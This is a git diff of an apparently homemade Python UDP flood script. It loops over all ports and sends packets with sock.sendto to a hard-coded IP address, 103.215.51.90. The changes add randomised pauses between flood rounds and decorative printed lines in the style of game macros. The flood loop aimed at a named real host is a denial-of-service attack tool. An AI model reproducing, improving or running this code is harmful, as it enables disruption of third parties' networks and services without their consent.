@@ -1,5 +1,6 @@
 
 # Import.
+from datetime import timedelta
 from   platform import system
 from   tqdm.auto import tqdm
 import os
@@ -39,22 +40,43 @@ time.sleep(1)
 print('\033[1;34mThe soul yearns for honor, and the flesh the hereafter...')
 time.sleep(1)
 print('\033[1;34mLook to those who walked before to lead those who walk after...')
-time.sleep(2)
-print('\033[1;34mHear...Feel...Think...')
 time.sleep(1)
-print('\033[1;36mGO!')
+print('')
+time.sleep(1)
+print('\033[1;34mHear...Feel...Think...')
+time.sleep(2)
+print('\033[0m-----------------------------------')
+time.sleep(1)
+print('\033[1;36m/ac Reflect <wait.3>')
+time.sleep(1)
+print('\033[1;36m/ac Manipulation <wait.2>')
+time.sleep(1)
+print('\033[1;36m/ac Preparatory Touch <wait.1>')
+time.sleep(1)
+print('\033[1;36m/ac Preparatory Touch <wait.1>')
+time.sleep(1)
+print('\033[1;36m/ac Great Strides <wait.2>')
+time.sleep(1)
+print("\033[1;36m/ac Byregot's Blessing <wait.3>")
+time.sleep(1)
+print('\033[1;36m/ac Great Veneration <wait.2>')
+time.sleep(1)
+print('\033[1;36m/ac Great Groundwork <wait.1>')
+time.sleep(1)
+print('\033[1;36m/ac Great Groundwork')
 time.sleep(1)
 
 sent = 0
+timeR = 600 + random.randint(0,20)
 
 if port_mode == False:  # All ports.
     try:
         while True:
             if port == 65534:
                 port = 1
-                print("\033[32;1mSented 65535 packets to 103.215.51.90 through port:All\033[0m")
-                print('\033[1;34mWait 10 min')
-                time.sleep(600)
+                print('\033[32;1mSented 65535 packets to 103.215.51.90 through port:All\033[0m')
+                print('\033[1;36m/wait %s'%(timeR))
+                time.sleep(timeR)
                 
 
             elif port == 1900:
@@ -63,6 +85,7 @@ if port_mode == False:  # All ports.
             sock.sendto(bytes, (str("103.215.51.90"), port))
             sent += 1
             port += 1
+            timeR = 10 + random.randint(0,20)
             
     except:
         print('\n\033[31;1mExited\033[0m')
